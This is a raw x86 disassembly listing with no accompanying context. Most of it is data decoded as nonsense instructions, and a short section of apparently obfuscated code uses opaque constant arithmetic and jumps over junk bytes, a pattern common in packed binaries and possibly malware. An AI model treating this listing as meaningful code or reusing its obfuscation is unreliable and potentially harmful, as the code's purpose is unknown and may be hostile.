  40ef41:	mov    cl,0x78
  40ef43:	repnz mov ecx,0xa8447f37
  40ef49:	fwait
  40ef4a:	dec    ecx
  40ef4b:	cmp    cl,dl
  40ef4d:	adc    DWORD PTR [edx+0x68],edx
  40ef50:	push   es
  40ef51:	inc    DWORD PTR [edi+0x978ee25]
  40ef57:	sub    eax,DWORD PTR [edi+0x4c]
  40ef5a:	ja     0x40efbc
  40ef5c:	pop    ecx
  40ef5d:	das    
  40ef5e:	add    esp,DWORD PTR [ebp+0x6]
  40ef61:	out    0x34,al
  40ef63:	idiv   DWORD PTR [edx-0x52]
  40ef66:	out    0x4d,eax
  40ef68:	pusha  
  40ef69:	scas   eax,DWORD PTR es:[edi]
  40ef6a:	clc    
  40ef6b:	pop    ss
  40ef6c:	stos   DWORD PTR es:[edi],eax
  40ef6d:	js     0x40ef3d
  40ef6f:	into   
  40ef70:	mov    esi,0xf146ca67
  40ef75:	(bad)  
  40ef76:	imul   eax,DWORD PTR [ebx+0x2],0xffffffe5
  40ef7a:	call   0x36ee517a
  40ef7f:	or     ebp,edi
  40ef81:	xchg   DWORD PTR [ebx],eax
  40ef83:	int    0x37
  40ef85:	fsubr  st,st(1)
  40ef87:	jmp    0x8bfc:0x388a5988
  40ef8e:	fnstenv [ebx+0x62]
  40ef91:	and    bp,ax
  40ef94:	test   al,0x85
  40ef96:	out    dx,al
  40ef97:	(bad)  
  40ef98:	xor    eax,ebx
  40ef9a:	xor    BYTE PTR [ebx-0x282a596],ch
  40efa0:	fs test eax,0x10a4034e
  40efa6:	dec    ebp
  40efa7:	or     eax,0x37909634
  40efac:	mov    cl,0x71
  40efae:	pusha  
  40efaf:	pop    eax
  40efb0:	jle    0x40efc5
  40efb2:	inc    edx
  40efb3:	xchg   BYTE PTR [ebp-0x679f63d6],ah
  40efb9:	hlt    
  40efba:	lods   al,BYTE PTR ds:[esi]
  40efbb:	or     al,0x16
  40efbd:	dec    edi
  40efbe:	(bad)  
  40efbf:	or     ch,ch
  40efc1:	jb     0x40efc7
  40efc3:	cmp    edx,eax
  40efc5:	leave  
  40efc6:	mov    ch,0x78
  40efc8:	add    ecx,DWORD PTR [edi+0x50fca487]
  40efce:	add    BYTE PTR [esi-0x26a43baa],bl
  40efd4:	retf   
  40efd5:	out    dx,al
  40efd6:	lock ins BYTE PTR es:[edi],dx
  40efd8:	sub    al,0xf4
  40efda:	pop    edx
  40efdb:	cwde   
  40efdc:	test   eax,0x1f7f8e72
  40efe1:	sbb    DWORD PTR [edx+ebx*1+0xc6d908f],ebp
  40efe8:	neg    esp
  40efea:	mov    esp,0xb800c7d0
  40efef:	cs test al,0x38
  40eff2:	cld    
  40eff3:	mov    ebx,0xb433a615
  40eff8:	(bad)  
  40eff9:	sti    
  40effa:	pop    ebx
  40effb:	aaa    
  40effc:	jg     0x40f024
  40effe:	push   edx
  40efff:	push   ebp
  40f000:	mov    ebp,fs
  40f002:	sub    BYTE PTR [ecx],bh
  40f004:	lds    edi,FWORD PTR [edx-0x49]
  40f007:	push   ecx
  40f008:	xor    al,0xf6
  40f00a:	pop    ebx
  40f00b:	add    dh,BYTE PTR [ebp+eiz*4-0xc]
  40f00f:	cmp    ch,BYTE PTR [ecx]
  40f011:	add    eax,0x544161bb
  40f016:	enter  0xaff2,0x53
  40f01a:	adc    eax,edi
  40f01c:	(bad)  
  40f01d:	in     eax,dx
  40f01e:	dec    ebx
  40f01f:	mov    ch,0x7d
  40f021:	push   0xffffff84
  40f023:	shl    DWORD PTR [ebp+0x45],cl
  40f026:	(bad)  
  40f027:	push   ebp
  40f028:	sbb    al,0xae
  40f02a:	adc    BYTE PTR [ebp+0x1e564779],0x29
  40f031:	or     al,0x6b
  40f033:	and    dh,0xf3
  40f036:	mov    eax,0xf1b22ca6
  40f03b:	outs   dx,BYTE PTR ds:[esi]
  40f03c:	shl    BYTE PTR [ebx],1
  40f03e:	daa    
  40f03f:	icebp  
  40f040:	and    ecx,esp
  40f042:	mov    WORD PTR [ebx-0x7f3e5840],?
  40f048:	pop    ebx
  40f049:	mov    esp,0x79035992
  40f04e:	pop    si
  40f050:	out    0x95,al
  40f052:	call   0xbb59:0x2c4ef3c7
  40f059:	jae    0x40f005
  40f05b:	fmul   DWORD PTR [edx]
  40f05d:	(bad)  
  40f05e:	jbe    0x40f0af
  40f060:	(bad)  
  40f061:	jnp    0x40f04a
  40f063:	and    esp,DWORD PTR [ebx]
  40f065:	xlat   BYTE PTR ds:[ebx]
  40f066:	push   ss
  40f067:	sub    DWORD PTR [esi-0x2a8ec9de],edx
  40f06d:	daa    
  40f06e:	jmp    FWORD PTR [eax]
  40f070:	retf   
  40f071:	adc    edi,esi
  40f073:	push   edx
  40f074:	jne    0x40f08e
  40f076:	dec    esi
  40f077:	adc    DWORD PTR [edi+eiz*1],edx
  40f07a:	loopne 0x40f0ad
  40f07c:	sahf   
  40f07d:	jp     0x40f065
  40f07f:	add    edi,edi
  40f081:	jo     0x40f0fa
  40f083:	addr16 mov al,ds:0x850f
  40f087:	or     bh,dh
  40f089:	(bad)  
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0xe84:0xaa146552
  40f09f:	aad    0xbc
  40f0a1:	jo     0x40f051
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [ecx],dl
  40f0aa:	pop    es
  40f0ab:	std    
  40f0ac:	loope  0x40f034
  40f0ae:	jbe    0x40f0df
  40f0b0:	mov    ebp,0xbf022e4a
  40f0b5:	test   al,0x37
  40f0b7:	sub    al,0x73
  40f0b9:	out    0x96,al
  40f0bb:	sub    eax,0xf83d6365
  40f0c0:	dec    edx
  40f0c1:	or     esi,edi
  40f0c3:	push   ds
  40f0c4:	(bad)  
  40f0c5:	jns    0x40f131
  40f0c7:	mov    DWORD PTR [ebp-0x9],esp
  40f0ca:	out    dx,eax
  40f0cb:	cmc    
  40f0cc:	mov    esi,0x6237fe6c
  40f0d1:	cmp    eax,0x6ad937ff
  40f0d6:	in     eax,0x51
  40f0d8:	dec    ebp
  40f0d9:	dec    ecx
  40f0da:	iret   
  40f0db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0dc:	inc    edi
  40f0dd:	adc    edi,0x3e
  40f0e0:	out    0x12,al
  40f0e2:	or     DWORD PTR [eax],0xf
  40f0e5:	or     BYTE PTR [edi],0xe8
  40f0e8:	pop    ss
  40f0e9:	add    eax,0x70b65612
  40f0ee:	fisttp QWORD PTR [ecx]
  40f0f0:	neg    BYTE PTR [esi]
  40f0f2:	cwde   
  40f0f3:	scas   al,BYTE PTR es:[edi]
  40f0f4:	cmp    eax,0xcbebdc4f
  40f0f9:	pop    ecx
  40f0fa:	pusha  
  40f0fb:	mov    ah,0x15
  40f0fd:	(bad)  
  40f0fe:	lods   eax,DWORD PTR ds:[esi]
  40f0ff:	fmul   st,st(1)
  40f101:	xor    DWORD PTR [ebx+0x1862bc73],ebp
  40f107:	mov    ebp,0x461bf506
  40f10c:	sub    DWORD PTR [esi-0x40c2cb02],edx
  40f112:	mov    WORD PTR [edx+0x61],cs
  40f115:	add    al,0xe7
  40f117:	repnz push esp
  40f119:	dec    esi
  40f11a:	adc    eax,0x26a0d302
  40f11f:	sub    ch,BYTE PTR [ecx]
  40f121:	(bad)  
  40f122:	push   ebp
  40f123:	in     al,0x85
  40f125:	gs in  eax,dx
  40f127:	test   DWORD PTR [ecx+0x52],edi
  40f12a:	rcr    DWORD PTR [ebx],0x59
  40f12d:	push   esi
  40f12e:	xchg   ecx,eax
  40f12f:	fiadd  WORD PTR [esi]
  40f131:	and    al,0xc
  40f133:	add    cl,0x94
  40f136:	xchg   BYTE PTR [ebp+ecx*1-0x1f],dh
  40f13a:	inc    dx
  40f13c:	dec    esi
  40f13d:	xchg   ebx,edx
  40f13f:	call   FWORD PTR [ebp-0x25]
  40f142:	push   sp
  40f144:	cwde   
  40f145:	pop    ds
  40f146:	pop    ebp
  40f147:	ja     0x40f18f
  40f149:	push   ebx
  40f14a:	dec    ecx
  40f14b:	call   0x807d1527
  40f150:	cmp    BYTE PTR [ecx],ch
  40f152:	(bad)  
  40f153:	cmp    DWORD PTR [ebp+0x708ae4c4],ecx
  40f159:	(bad)  
  40f15a:	fild   DWORD PTR [ecx+0x4a]
  40f15d:	in     eax,0x2c
  40f15f:	xchg   esi,eax
  40f160:	sbb    ebp,DWORD PTR [eax-0x25c9b563]
  40f166:	mov    ebx,0xaf57b439
  40f16b:	out    0x79,eax
  40f16d:	jno    0x40f152
  40f16f:	mov    esi,0xa9e55f74
  40f174:	pop    eax
  40f175:	scas   al,BYTE PTR es:[edi]
  40f176:	stos   BYTE PTR es:[edi],al
  40f177:	dec    ebp
  40f178:	test   eax,0xe4992d44
  40f17d:	(bad)  
  40f17e:	and    BYTE PTR [ebp-0x77b38a29],bh
  40f184:	jns    0x40f1fd
  40f186:	int    0x9d
  40f188:	xchg   ecx,eax
  40f189:	pop    ecx
  40f18a:	xchg   esp,eax
  40f18b:	imul   esi,ebx,0x4694c4fa
  40f191:	fadd   DWORD PTR ds:0x29eac84b
  40f197:	jle    0x40f1b2
  40f199:	push   ecx
  40f19a:	icebp  
  40f19b:	mov    al,0xe1
  40f19d:	cmp    DWORD PTR [edi],eax
  40f19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1a0:	call   0xd3ad05c1
  40f1a5:	pop    esp
  40f1a6:	imul   BYTE PTR [ebx]
  40f1a8:	retf   0x2c0c
  40f1ab:	lds    esi,FWORD PTR [ecx-0x28]
  40f1ae:	dec    esp
  40f1af:	or     ch,ch
  40f1b1:	xor    BYTE PTR [ecx+edi*4+0x5d],dl
  40f1b5:	aad    0xae
  40f1b7:	int    0x7a
  40f1b9:	iret   
  40f1ba:	push   esi
  40f1bb:	jae    0x40f21c
  40f1bd:	xor    edx,ebp
  40f1bf:	je     0x40f1f7
  40f1c1:	xchg   esp,eax
  40f1c2:	cmp    al,0xdb
  40f1c4:	cwde   
  40f1c5:	mov    al,0x6f
  40f1c7:	sbb    eax,0x886f02e0
  40f1cc:	adc    eax,0xf5dcc03b
  40f1d1:	out    dx,al
  40f1d2:	mov    bh,0x72
  40f1d4:	fs loope 0x40f1e7
  40f1d7:	add    BYTE PTR [ebp+eiz*1+0x0],ch
  40f1db:	and    eax,0x13d8d09f
  40f1e0:	fisttp DWORD PTR [edx]
  40f1e2:	dec    eax
  40f1e3:	or     BYTE PTR [ecx-0x28c0ad23],ch
  40f1e9:	xor    DWORD PTR [edi-0x57],ebx
  40f1ec:	inc    esp
  40f1ed:	sub    al,0x80
  40f1ef:	adc    esp,esi
  40f1f1:	jae    0x40f1d9
  40f1f3:	call   FWORD PTR [eax-0x3535a6e8]
  40f1f9:	je     0x40f24b
  40f1fb:	dec    ecx
  40f1fc:	arpl   WORD PTR ds:0x23edcc85,sp
  40f202:	pop    es
  40f203:	and    eax,0xbee8fa27
  40f208:	shr    BYTE PTR [ebx-0x64b5f041],1
  40f20e:	and    DWORD PTR [esi+0xf],edx
  40f211:	adc    bh,ch
  40f213:	pop    esi
  40f214:	cmp    ah,BYTE PTR [esi+0x92a2f1f]
  40f21a:	mov    ah,0x78
  40f21c:	sbb    BYTE PTR [ebx+0x71],dh
  40f21f:	fisttp WORD PTR [ebx+0x65]
  40f222:	outs   dx,BYTE PTR ds:[esi]
  40f223:	xchg   edx,eax
  40f224:	(bad)  
  40f226:	xor    DWORD PTR [edi],0xffffffed
  40f229:	xor    eax,0x3ab88e0
  40f22e:	clc    
  40f22f:	jg     0x40f235
  40f231:	iret   
  40f232:	cmp    bl,BYTE PTR [edi+edi*4]
  40f235:	in     eax,0xb8
  40f237:	repnz cli 
  40f239:	jnp    0x40f27a
  40f23b:	jl     0x40f22e
  40f23d:	adc    BYTE PTR ds:0x8990dd20,bl
  40f243:	test   BYTE PTR [ecx],al
  40f245:	mov    ebp,0xdecc3129
  40f24a:	out    0xaa,eax
  40f24c:	mov    DWORD PTR [ecx+edi*1+0x9df2c0],esp
  40f253:	pop    edi
  40f254:	jo     0x40f203
  40f256:	mov    ds:0xae9e231d,al
  40f25b:	dec    ebp
  40f25c:	adc    eax,0xd52231ed
  40f261:	scas   eax,DWORD PTR es:[edi]
  40f262:	out    0x95,eax
  40f264:	fisubr WORD PTR [ecx+ebp*4+0x8]
  40f268:	xor    ebp,DWORD PTR [edi+0x37]
  40f26b:	dec    edx
  40f26c:	xor    dh,BYTE PTR [esi]
  40f26e:	adc    eax,DWORD PTR [ecx+0x1844d189]
  40f274:	add    al,0x52
  40f276:	enter  0x6df6,0x43
  40f27a:	out    dx,al
  40f27b:	mov    ch,BYTE PTR [ecx]
  40f27d:	dec    ebp
  40f27e:	inc    eax
  40f27f:	aam    0xbf
  40f281:	push   es
  40f282:	mov    dh,ch
  40f284:	or     bl,BYTE PTR [ebx]
  40f286:	adc    eax,0x6505ec39
  40f28b:	cli    
  40f28c:	xchg   ebx,eax
  40f28d:	xchg   edi,eax
  40f28e:	dec    ebp
  40f28f:	call   0x810307b7
  40f294:	(bad)  
  40f295:	xchg   ebp,eax
  40f296:	scas   eax,DWORD PTR es:[edi]
  40f297:	inc    ebx
  40f298:	icebp  
  40f299:	mov    ecx,ecx
  40f29b:	(bad)  
  40f29d:	or     BYTE PTR [ebx+0x17],dl
  40f2a0:	mov    BYTE PTR ds:0xe68d45e6,0x6c
  40f2a7:	xor    DWORD PTR [edx],ecx
  40f2a9:	and    eax,eax
  40f2ab:	scas   al,BYTE PTR es:[edi]
  40f2ac:	aad    0x3c
  40f2ae:	push   esp
  40f2af:	xchg   edi,eax
  40f2b0:	inc    esi
  40f2b1:	rcr    DWORD PTR [eax+0x2d],1
  40f2b4:	rol    DWORD PTR [esp+ebp*1-0x1c],1
  40f2b8:	cmp    edx,0x2
  40f2bb:	fistp  QWORD PTR [edi]
  40f2bd:	push   esp
  40f2be:	fmul   st,st(1)
  40f2c0:	xchg   BYTE PTR [ecx-0x54],cl
  40f2c3:	test   DWORD PTR [ebp-0x55],ecx
  40f2c6:	(bad)  [ebp+0x47]
  40f2c9:	adc    esi,esp
  40f2cb:	mov    esp,0xbd5fc59d
  40f2d0:	dec    edx
  40f2d1:	jmp    0x5ae5:0x9765bf13
  40f2d8:	mov    al,0x13
  40f2da:	inc    eax
  40f2db:	jmp    0xc491c66e
  40f2e0:	push   0xfffffffa
  40f2e2:	aad    0x76
  40f2e4:	in     eax,dx
  40f2e5:	or     dl,BYTE PTR [ebx-0x5]
  40f2e8:	sbb    DWORD PTR [esi],edx
  40f2ea:	call   0x3844b8d8
  40f2ef:	cmp    cl,0x91
  40f2f2:	rol    DWORD PTR [esi+0xc2297ad],1
  40f2f8:	je     0x40f31e
  40f2fa:	push   0x3cb89316
  40f2ff:	dec    esp
  40f300:	push   es
  40f301:	std    
  40f302:	sbb    dh,BYTE PTR [edx-0x73e1ee79]
  40f308:	mov    WORD PTR ds:0x5116b383,ss
  40f30e:	dec    ecx
  40f30f:	sub    esp,DWORD PTR [edi+edi*2+0x46a4101d]
  40f316:	sbb    DWORD PTR [edx],edx
  40f318:	in     al,0xa
  40f31a:	jo     0x40f32f
  40f31c:	lods   al,BYTE PTR ds:[esi]
  40f31d:	mov    ds:0x223b40d7,eax
  40f322:	xor    al,0x16
  40f324:	and    eax,0x922482f
  40f329:	sbb    DWORD PTR ss:[edx+0x1],ebx
  40f32d:	push   edx
  40f32e:	mov    edx,0x68878aa3
  40f333:	cwde   
  40f334:	cdq    
  40f335:	out    dx,al
  40f336:	out    0xe6,al
  40f338:	shr    DWORD PTR [esi-0x702061da],0x20
  40f33f:	retf   
  40f340:	adc    eax,0x31b9051
  40f345:	sub    DWORD PTR [edi],ecx
  40f347:	and    DWORD PTR [esi],esi
  40f349:	data16 jle 0x40f2e6
  40f34c:	jae    0x40f316
  40f34e:	xchg   esi,eax
  40f34f:	jle    0x40f3af
  40f351:	pop    ebx
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0xffffffe7
  40f384:	shl    BYTE PTR [ecx],cl
  40f386:	jle    0x40f3b3
  40f388:	test   al,0x18
  40f38a:	sbb    BYTE PTR [esi-0x79e7e7ec],bh
  40f390:	hlt    
  40f391:	xor    bh,dh
  40f393:	jmp    0x19a4:0x7f81ba7b
  40f39a:	mov    ebp,DWORD PTR [ecx]
  40f39c:	test   al,0xb6
  40f39e:	shld   DWORD PTR [esi+0x4cde2917],ecx,cl
  40f3a5:	lea    ecx,[eax]
  40f3a7:	jmp    0xed6a:0x21d3af81
  40f3ae:	mov    ecx,0x2fbf6100
  40f3b3:	xor    DWORD PTR [ebp-0x1d],esp
  40f3b6:	test   eax,0xe9284ce9
  40f3bb:	(bad)
  40f3c0:	xchg   ebx,eax
  40f3c1:	hlt    
  40f3c2:	add    dh,BYTE PTR [edx+0x70]
  40f3c5:	rcr    ebp,cl
  40f3c7:	push   0x9b81064b
  40f3cc:	enter  0xbfb1,0xc3
  40f3d0:	mov    edx,0x6d575e23
  40f3d5:	cmp    BYTE PTR [esi+esi*2],cl
  40f3d8:	push   ss
  40f3d9:	lds    edx,FWORD PTR [eax]
  40f3db:	pop    esp
  40f3dc:	in     eax,0x74
  40f3de:	mov    BYTE PTR [eax],bl
  40f3e0:	jbe    0x40f37e
  40f3e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3e3:	hlt    
  40f3e4:	push   edx
  40f3e5:	sahf   
  40f3e6:	mov    ah,al
  40f3e8:	mov    ebp,0x84675339
  40f3ed:	adc    al,0xdb
  40f3ef:	out    dx,al
  40f3f0:	inc    edx
  40f3f1:	pop    ss
  40f3f2:	stos   BYTE PTR es:[edi],al
  40f3f3:	popf   
  40f3f4:	rol    DWORD PTR [edx-0x12],cl
  40f3f7:	jne    0x40f3a5
  40f3f9:	scas   eax,DWORD PTR es:[edi]
  40f3fa:	lds    ebp,FWORD PTR [ecx+0x60]
  40f3fd:	cwde   
  40f3fe:	sti    
  40f3ff:	je     0x40f3bc
  40f401:	inc    ebx
  40f402:	jmp    0x5969:0x86e47abe
  40f409:	dec    edi
  40f40a:	pop    ecx
  40f40b:	add    eax,0x2b324c57
  40f410:	in     al,0x3b
  40f412:	or     BYTE PTR [ecx+0x51b99e8],0x94
  40f419:	mov    edi,0xca0d65dd
  40f41e:	pop    edx
  40f41f:	and    DWORD PTR [ebx+edx*8-0x3b6f783b],0x6cf43bd1
  40f42a:	pop    esp
  40f42b:	add    dl,BYTE PTR [edi]
  40f42d:	popa   
  40f42e:	call   0x7462:0x39d3f05a
  40f435:	sub    eax,0xb7582477
  40f43a:	jns    0x40f3f6
  40f43c:	(bad)  
  40f43d:	mov    esp,0xfea482e
  40f442:	fwait
  40f443:	sub    ah,bh
  40f445:	ins    DWORD PTR es:[edi],dx
  40f446:	mov    esi,0x303c1c8b
  40f44b:	mov    ebx,0x32a277
  40f450:	popf   
  40f451:	and    WORD PTR [esp+ebp*8],0xe954
  40f457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f458:	mov    edx,0xd6b213ae
  40f45d:	test   eax,0x4bb4c072
  40f462:	mov    DWORD PTR [esi+esi*8],eax
  40f465:	cld    
  40f466:	pop    es
  40f467:	xchg   esp,eax
  40f468:	fild   QWORD PTR [esi]
  40f46a:	xchg   ecx,eax
  40f46b:	mov    al,ds:0x5923e8db
  40f470:	mov    bh,0x6e
  40f472:	push   ss
  40f473:	imul   esp,edx,0xf
  40f476:	mov    ds:0x3ae6ca82,eax
  40f47b:	dec    esp
  40f47c:	shr    bh,1
  40f47e:	jbe    0x40f47a
  40f480:	in     al,dx
  40f481:	jge    0x40f463
  40f483:	push   cs
  40f484:	es pop edx
  40f486:	sahf   
  40f487:	test   eax,0xf7f5606a
  40f48c:	add    cl,dl
  40f48e:	scas   al,BYTE PTR es:[edi]
  40f48f:	neg    BYTE PTR [ebp+0x486528fd]
  40f495:	jns    0x40f477
  40f497:	add    al,0x7b
  40f499:	adc    DWORD PTR [ebx+0x7c],edi
  40f49c:	popa   
  40f49d:	retf   
  40f49e:	mov    DWORD PTR [ecx+0x5d0aaf0],eax
  40f4a4:	es dec edx
  40f4a6:	sub    ebx,DWORD PTR [esp+edx*1+0x5]
  40f4aa:	fisub  DWORD PTR [ebx+0x21b60afb]
  40f4b0:	cdq    
  40f4b1:	stos   DWORD PTR es:[edi],eax
  40f4b2:	jl     0x40f48c
  40f4b4:	int    0x44
  40f4b6:	xor    BYTE PTR [ebp+0xe58d191],0xa3
  40f4bd:	xor    cl,BYTE PTR [esi]
  40f4bf:	jg     0x40f4cc
  40f4c1:	push   0x4c
  40f4c3:	push   0xe747e378
  40f4c8:	cmp    esi,DWORD PTR [ebx-0xe]
  40f4cb:	add    eax,DWORD PTR [ecx]
  40f4cd:	sbb    DWORD PTR [eax],esi
  40f4cf:	dec    esp
  40f4d0:	scas   eax,DWORD PTR es:[edi]
  40f4d1:	(bad)  
  40f4d2:	push   ds
  40f4d3:	je     0x40f47b
  40f4d5:	adc    al,0x6b
  40f4d7:	test   al,0x76
  40f4d9:	fistp  QWORD PTR ds:0x4f22da2d
  40f4df:	push   ds
  40f4e0:	and    ebp,ebp
  40f4e2:	ja     0x40f48c
  40f4e4:	mov    ss,ecx
  40f4e6:	mov    eax,DWORD PTR [ecx+0xe]
  40f4e9:	test   DWORD PTR [ecx-0x53ef019a],esp
  40f4ef:	push   edi
  40f4f0:	je     0x40f4e5
  40f4f2:	xchg   esi,eax
  40f4f3:	push   es
  40f4f4:	dec    ebx
  40f4f5:	gs mov dh,0xbc
  40f4f8:	push   esp
  40f4f9:	push   eax
  40f4fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4fb:	in     al,0x5c
  40f4fd:	or     BYTE PTR [ebx-0x33523d7a],dh
  40f503:	add    dl,BYTE PTR [edx-0x8]
  40f506:	xchg   BYTE PTR [ebp+0x54],ch
  40f509:	add    esp,DWORD PTR ds:0xe1e7f58c
  40f50f:	xchg   ebx,eax
  40f510:	bound  eax,QWORD PTR [eax-0x12]
  40f513:	add    dh,BYTE PTR [edi]
  40f515:	dec    ebx
  40f516:	inc    esi
  40f517:	ss mov esi,0x6c2fdcaf
  40f51d:	fimul  DWORD PTR [esi-0x54d6a296]
  40f523:	mov    ds:0x8449a714,eax
  40f528:	mov    ecx,0xa58fbe4a
  40f52d:	retf   0x839
  40f530:	ins    BYTE PTR es:[edi],dx
  40f531:	inc    esi
  40f532:	mov    ?,WORD PTR [ebx-0x4740983c]
  40f538:	jns    0x40f558
  40f53a:	mov    eax,ds:0x70ba363b
  40f53f:	addr16 dec ebx
  40f541:	(bad)  
  40f542:	cmp    dh,BYTE PTR [ecx-0x46d2f2c4]
  40f548:	or     ch,BYTE PTR [ebp-0x2f]
  40f54b:	fcmovu st,st(1)
  40f54d:	loopne 0x40f4d7
  40f54f:	imul   ebx,DWORD PTR [ebx],0x662d8c0c
  40f555:	bound  esp,QWORD PTR [esi]
  40f557:	ss out dx,al
  40f559:	xor    eax,0x1c9fe6ed
  40f55e:	(bad)  
  40f55f:	ds jl  0x40f528
  40f562:	(bad)  
  40f563:	(bad)  
  40f564:	cmp    al,0xb6
  40f566:	addr16 xor edi,0x6e51a32a
  40f56d:	sar    DWORD PTR [edx],cl
  40f56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f570:	lods   al,BYTE PTR ds:[esi]
  40f571:	pop    eax
  40f572:	test   BYTE PTR [edi],0x41
  40f575:	(bad)  
  40f576:	adc    BYTE PTR [edi],cl
  40f578:	lock xchg ebx,eax
  40f57a:	or     ah,BYTE PTR [esi+0x11a258a0]
  40f580:	outs   dx,BYTE PTR ds:[esi]
  40f581:	ja     0x40f55a
  40f583:	mov    dh,0x37
  40f585:	add    al,0xbd
  40f587:	icebp  
  40f588:	dec    eax
  40f589:	push   0x39
  40f58b:	jnp    0x40f552
  40f58d:	mov    ah,0xa3
  40f58f:	imul   ecx,DWORD PTR [ebx],0x43
  40f592:	sub    al,0xb2
  40f594:	retf   
  40f595:	mov    edx,0x506151d6
  40f59a:	cmp    BYTE PTR [edi-0x1b],bl
  40f59d:	lds    esi,FWORD PTR ds:0x7cf892f1
  40f5a3:	push   es
  40f5a4:	sbb    esi,esp
  40f5a6:	dec    ebp
  40f5a7:	dec    eax
  40f5a8:	rol    DWORD PTR [ebp+0x58],0x31
  40f5ac:	fsub   QWORD PTR [ebx]
  40f5ae:	lea    esp,[ecx+esi*2+0xf]
  40f5b2:	xchg   BYTE PTR [eax-0x5b943545],bh
  40f5b8:	and    eax,0x7c88a278
  40f5bd:	xchg   edi,eax
  40f5be:	jp     0x40f56c
  40f5c0:	dec    eax
  40f5c1:	mov    eax,0x181b86d6
  40f5c6:	pop    esi
  40f5c7:	sbb    eax,0x3019f1dc
  40f5cc:	dec    ecx
  40f5cd:	test   DWORD PTR [ebx+0x36],ebx
  40f5d0:	aas    
  40f5d1:	call   0xa3b2:0xb3983d11
  40f5d8:	xor    BYTE PTR [eax-0x3b],dh
  40f5db:	jo     0x40f648
  40f5dd:	les    esp,FWORD PTR [esi-0x2593cea5]
  40f5e3:	push   0x7ddc42a6
  40f5e8:	cwde   
  40f5e9:	mov    dh,0x72
  40f5eb:	mov    al,0x2e
  40f5ed:	test   eax,0x14c63660
  40f5f2:	jmp    0x6ad8:0x4c817ce6
  40f5f9:	fcom   DWORD PTR [edi+eiz*4+0x18]
  40f5fd:	push   esp
  40f5fe:	pushf  
  40f5ff:	and    cl,BYTE PTR [eax]
  40f601:	mov    edx,0x7876b0f5
  40f606:	add    DWORD PTR [ebp-0x4654979f],0xffffff82
  40f60d:	push   esp
  40f60e:	or     DWORD PTR [esi+edx*8-0x783d919d],ebx
  40f615:	inc    ebx
  40f616:	dec    ebp
  40f617:	add    edx,DWORD PTR gs:[eax+0x184f7dd3]
  40f61e:	mov    ds:0x9f242971,al
  40f623:	jmp    0x40f60b
  40f625:	pop    eax
  40f626:	inc    ebx
  40f627:	xor    eax,ebp
  40f629:	mov    ds:0x1c0984b5,eax
  40f62e:	sub    BYTE PTR [edx+0x2cd35c71],0x47
  40f635:	dec    eax
  40f636:	ret    0x2782
  40f639:	test   al,0xc1
  40f63b:	add    ecx,DWORD PTR [esi-0x46]
  40f63e:	mov    esi,0xf84d8ba7
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x4225a8
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x4226dc
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
